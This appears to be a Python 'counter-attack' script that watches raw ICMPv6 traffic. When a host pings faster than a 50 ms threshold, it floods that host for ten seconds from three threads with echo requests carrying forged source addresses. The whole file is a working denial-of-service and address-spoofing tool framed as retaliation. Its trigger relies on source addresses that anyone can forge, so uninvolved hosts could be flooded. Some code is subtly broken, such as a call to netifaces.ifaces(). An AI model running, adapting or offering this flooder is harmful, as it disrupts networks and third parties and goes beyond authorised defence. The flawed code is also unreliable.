#!/usr/bin/env python3
import socket
import struct
import datetime
import time
import threading
import argparse
import netifaces
import random
import binascii

ETH_P_IPV6 = 0x86DD
ICMPV6_ECHO_REQUEST = 128
THRESHOLD = datetime.timedelta(milliseconds=50)  # Adjusted for realistic detection
KNOWN_HOSTS = {}
HOSTS_LOCK = threading.Lock()
iface = None
local_mac = None
gateway_mac = b'\xff\xff\xff\xff\xff\xff'  # Placeholder; use ARP in production
subnet_ips = []

def get_mac_address(iface):
    """Retrieve the MAC address of the interface."""
    try:
        addrs = netifaces.ifaces()[iface]
        mac = addrs[netifaces.AF_LINK][0]['addr']
        return binascii.unhexlify(mac.replace(':', ''))
    except Exception as e:
        print(f"Erro ao obter MAC: {e}")
        exit(1)

def build_ethernet_header(src_mac, dst_mac):
    """Construct Ethernet header."""
    return struct.pack('!6s6sH', dst_mac, src_mac, ETH_P_IPV6)

def build_ipv6_header(src_ip, dst_ip, payload_len):
    """Construct IPv6 header."""
    version_traffic_class_flow = (6 << 28)  # Version 6, TC=0, Flow Label=0
    next_header = 58  # ICMPv6
    hop_limit = 255
    try:
        src_ip_bytes = socket.inet_pton(socket.AF_INET6, src_ip)
        dst_ip_bytes = socket.inet_pton(socket.AF_INET6, dst_ip)
    except socket.error as e:
        print(f"Erro ao converter IPs: {e}")
        return None
    return struct.pack('!IHBB16s16s', version_traffic_class_flow, payload_len, next_header, hop_limit, src_ip_bytes, dst_ip_bytes)

def build_icmpv6_echo_request():
    """Construct ICMPv6 Echo Request header."""
    type_ = ICMPV6_ECHO_REQUEST
    code = 0
    checksum = 0
    identifier = random.randint(0, 65535)
    sequence = 1
    return struct.pack('!BBHHH', type_, code, checksum, identifier, sequence)

def calculate_checksum(data):
    """Calculate ICMPv6 checksum."""
    if len(data) % 2:
        data += b'\x00'
    checksum = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i+1]
        checksum += word
    while checksum >> 16:
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    return ~checksum & 0xFFFF

def build_packet(src_mac, dst_mac, src_ip, dst_ip):
    """Build complete packet with Ethernet, IPv6, and ICMPv6 headers."""
    icmpv6 = build_icmpv6_echo_request()
    ipv6 = build_ipv6_header(src_ip, dst_ip, len(icmpv6))
    if ipv6 is None:
        return None
    ethernet = build_ethernet_header(src_mac, dst_mac)
    pseudo_header = socket.inet_pton(socket.AF_INET6, src_ip) + socket.inet_pton(socket.AF_INET6, dst_ip) + struct.pack('!IHBB', len(icmpv6), 0, 0, 58)
    checksum = calculate_checksum(pseudo_header + icmpv6)
    icmpv6 = icmpv6[:2] + struct.pack('!H', checksum) + icmpv6[4:]
    return ethernet + ipv6 + icmpv6

def parse_ipv6_header(packet):
    """Parse IPv6 header from raw packet."""
    if len(packet) < 54:
        raise ValueError("Pacote muito curto")
    ipv6_header = packet[14:54]
    unpacked = struct.unpack('!4sHBB16s16s', ipv6_header)
    src_ip = socket.inet_ntop(socket.AF_INET6, unpacked[4])
    dst_ip = socket.inet_ntop(socket.AF_INET6, unpacked[5])
    next_header = unpacked[2]
    return src_ip, dst_ip, next_header

def process_icmpv6_packet(packet, src_ip, dst_ip):
    """Process ICMPv6 packet and detect flooding."""
    now = datetime.datetime.utcnow()
    icmpv6_offset = 14 + 40
    if len(packet) < icmpv6_offset + 1:
        return
    icmp_type = packet[icmpv6_offset]

    if icmp_type == ICMPV6_ECHO_REQUEST:
        print(f"[ICMPv6] Echo Request de {src_ip} -> {dst_ip}")
        with HOSTS_LOCK:
            if src_ip in KNOWN_HOSTS:
                time_diff = now - KNOWN_HOSTS[src_ip]
                if time_diff < THRESHOLD:
                    print(f"⚠️ Ataque detectado de {src_ip}! Intervalo: {time_diff}")
                    print("🚨 Contra-atacando...")
                    start_ddos_flood(src_ip)
            KNOWN_HOSTS[src_ip] = now

def flood_icmpv6(attacker_ip, stop_event):
    """Send spoofed ICMPv6 Echo Requests to the attacker."""
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_IPV6))
        s.bind((iface, 0))
    except Exception as e:
        print(f"Erro ao criar socket de envio: {e}")
        return
    src_ip = random.choice(subnet_ips)
    packet = build_packet(local_mac, gateway_mac, src_ip, attacker_ip)
    if packet is None:
        s.close()
        return
    start_time = time.time()
    while not stop_event.is_set() and (time.time() - start_time) < 10:  # 10s limit
        try:
            s.send(packet)
        except Exception as e:
            print(f"Erro no envio: {e}")
            break
    s.close()

def start_ddos_flood(attacker_ip):
    """Start DDoS flood with multiple threads."""
    stop_event = threading.Event()
    threads = []
    for _ in range(3):  # Simulate 3 "hosts"
        t = threading.Thread(target=flood_icmpv6, args=(attacker_ip, stop_event), daemon=True)
        t.start()
        threads.append(t)
    time.sleep(10)
    stop_event.set()
    for t in threads:
        t.join()

def main():
    global iface, local_mac, subnet_ips
    parser = argparse.ArgumentParser(description="ICMPv6 Ping Flood Counter-Attack")
    parser.add_argument('--iface', required=True, help='Network interface (e.g., enp4s0)')
    args = parser.parse_args()
    iface = args.iface

    try:
        local_mac = get_mac_address(iface)
        # Placeholder subnet IPs; replace with real subnet scan
        subnet_ips = [f"2001:db8::1{i}" for i in range(1, 6)]
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_IPV6))
        s.bind((iface, 0))
    except Exception as e:
        print(f"Erro ao configurar: {e}")
        exit(1)

    print(f"✅ Monitorando tráfego ICMPv6 em {iface}...")

    while True:
        try:
            packet, _ = s.recvfrom(65536)
            eth_header = packet[:14]
            eth = struct.unpack('!6s6sH', eth_header)
            if eth[2] == ETH_P_IPV6:
                src_ip, dst_ip, next_header = parse_ipv6_header(packet)
                if next_header == 58:  # ICMPv6
                    process_icmpv6_packet(packet, src_ip, dst_ip)
        except Exception as e:
            print(f"Erro ao processar pacote: {e}")

if __name__ == "__main__":
    main()